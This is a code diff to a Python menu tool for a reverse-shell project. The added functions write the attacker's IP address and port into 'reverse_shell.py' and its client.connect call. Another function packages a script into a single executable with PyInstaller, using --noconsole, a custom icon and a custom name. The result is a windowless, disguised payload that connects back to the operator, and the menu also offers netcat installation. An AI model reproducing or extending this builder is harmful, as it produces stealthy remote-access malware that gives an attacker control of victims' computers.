@@ -107,6 +107,168 @@ class Setup:
             except Exception as e:
                 print("\n[ERROR] Installation error: ", e)
 
+# ---------------- Become your file in executable ------------- #
+    def create_executable(self):
+
+        while True:
+
+            executable = input("\nWould you wish become your file in executable [y/n]? ").strip().lower()
+
+            if executable == 'y':
+                file_name = input("\nSet your file.py path: ").strip()
+                img_icon = input("\nSet your file.icon path: ").strip()
+                name = input("\nChoose a name for your executable: ").strip()
+
+                self.pyinstaller_executable(file_name, img_icon, name)
+                break
+            
+            elif executable == 'n':
+                print("\nBye, Bye!\n")
+                break
+                
+            else:
+                print("\n* Your answer is not allowed try again...\n")
+
+    def edit(self, file_name, target_line, new_content):
+        try:
+            with open(file_name, "r") as file:
+                lines = file.readlines()
+
+            if 0 <= int(target_line) < len(lines):
+                lines[target_line] = f"ip = '{new_content}'" + '\n'
+
+            with open(file_name, "w") as file:
+                file.writelines(lines)
+                print("\n[+] Line updated!\n")
+                file.close()
+
+        except FileNotFoundError:
+            print("\n File not found!\n")
+        except Exception as e:
+            print("\n[!] Exception: ",e)
+
+    def edit_port(self, file_name, target_line, new_content):
+        try:
+            with open(file_name, "r") as file:
+                lines = file.readlines()
+
+            if 0 <= int(target_line) < len(lines):
+                lines[target_line] = f"port = {new_content}" + '\n'
+
+            with open(file_name, "w") as file:
+                file.writelines(lines)
+                print("\n[+] Line updated!\n")
+                file.close()
+
+        except FileNotFoundError:
+            print("\n File not found!\n")
+        except Exception as e:
+            print("\n[!] Exception: ",e)
+
+    def edit_client_ip(self, file_name, target_line, new_content, new_port):
+        try:
+            with open(file_name, "r") as file:
+                lines = file.readlines()
+
+            if 0 <= int(target_line) < len(lines):
+                lines[target_line] = f"        client.connect(('{new_content}', {new_port}))" + '\n'
+
+            with open(file_name, "w") as file:
+                file.writelines(lines)
+                print("\n[+] Line updated!\n")
+                file.close()
+
+        except FileNotFoundError:
+            print("\n File not found!\n")
+        except Exception as e:
+            print("\n[!] Exception: ",e)
+
+    def pyinstaller_executable(self, file_name,img_icon,name_executable):
+        try:
+            command = f'pyinstaller {file_name} --onefile --noconsole --icon {img_icon} --name {name_executable}'
+            
+            out = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
+            
+            print(out.stdout)
+            
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred: {e.stderr}")
+
+    def main(self):
+    # ------------- change ip reverse_shell ------------- #
+        while True:
+            while True:
+                change_ip_reverse_shell = input("\nDo you wish change the default '127.0.0.1' of your reverse shell [y/n]? ").strip()
+
+                if change_ip_reverse_shell == 'y':
+
+                    file_name = 'reverse_shell.py'
+                    target_line = 9
+                    new_content = input("Type your ip address: ").strip()
+
+                    self.edit(file_name,target_line,new_content)
+                    break
+
+                elif change_ip_reverse_shell == 'n':
+                    break
+
+                else:
+                    print("\n* Your answer is not allowed try again...\n")
+
+    # ---------------- change port reverse_shell -------------- #
+
+            while True:
+                change_port_reverse_shell = input("\nDo you wish change the default 8081 port of your reverse shell [y/n]? ").strip()
+
+                if change_port_reverse_shell == 'y':
+                    
+                    file_name = "reverse_shell.py"
+                    target_line = 10
+                    try:
+                        new_content = int(input("Type your port address: ").strip())
+                    except ValueError:
+                        print("\nOnly numbers are accepted, try again...")
+
+                    self.edit_port(file_name,target_line,new_content)
+                    break
+
+                elif change_port_reverse_shell == 'n':
+                    break
+
+                else:
+                    print("\n[!] Wrong answer try again!\n")
+
+
+    # ------------------  change ip and port client ------------------------ #
+            while True:
+
+                change_ip_client_connection = input("\nDo you wish change the default ip='127.0.0.1' or 8887 port of your client connection [y/n]? ").strip()
+
+                if change_ip_client_connection == 'y':
+
+                    file_name = 'reverse_shell.py'
+                    new_content = input("\nType your ip address: ").strip()
+
+                    try:
+                        new_port = int(input('Port number: '))
+                        
+                    except ValueError:
+                        print("\nThe port must be an integer!\n")
+                    else:
+                        print(f"You entered port: {new_port}")
+
+                    self.edit_client_ip(file_name, 113, new_content, new_port)
+                    break
+                    
+                elif change_ip_client_connection == 'n':
+                    break
+
+                else:
+                    print("\n[!] Wrong answer try again!\n")
+
+            break
+
+
 
 class Menu:
     def __init__(self):
@@ -127,7 +289,9 @@ MENU PANEL USAGE:
 1. Activate Server on 8887 port;
 2. Activate Client on 8889 port;
 3. Netcat installation;
-4. Exit.
+4. Setup of your reverse shell ip and port;
+5. Become executable;
+6. Exit.
 
 ###############
 
@@ -146,7 +310,12 @@ Choose: """
                 elif result == 3:
                     self.system.netcat_installation()
                 elif result == 4:
+                    self.system.main()
+                elif result == 5:
+                    self.system.create_executable()
+                elif result == 6:
                     self.exit()
+
         except Exception as e:
             print("\nProgram failed", e)
         except KeyboardInterrupt:
